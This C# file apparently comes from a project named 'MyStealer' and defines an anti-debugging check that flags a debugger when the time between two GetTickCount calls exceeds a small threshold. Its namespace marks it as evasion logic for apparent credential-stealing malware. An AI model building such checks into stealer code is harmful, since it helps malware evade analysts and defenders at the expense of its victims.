using static MyStealer.AntiDebug.Win32Calls;

namespace MyStealer.AntiDebug.Check.Debug
{
    /// <summary>
    /// https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiDebug.cs
    /// </summary>
    public class ExecutionTooSlow : CheckBase
    {
        public override string Name => "GetTickCount delta too large";

        public override bool CheckActive()
        {
            var start = GetTickCount();
            return GetTickCount() - start > 0x10;
        }
    }
}
